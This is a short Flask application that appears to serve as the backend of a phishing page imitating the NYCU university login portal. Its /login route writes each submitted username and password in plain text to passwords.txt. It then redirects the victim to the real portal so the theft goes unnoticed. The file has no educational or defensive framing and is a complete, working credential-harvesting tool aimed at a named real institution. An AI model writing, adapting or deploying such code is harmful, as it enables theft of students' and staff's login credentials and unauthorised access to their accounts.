from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    with open("passwords.txt", "a") as f:
        f.write(f"{username},{password}\n")

    return redirect("https://portal.nycu.edu.tw")



if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)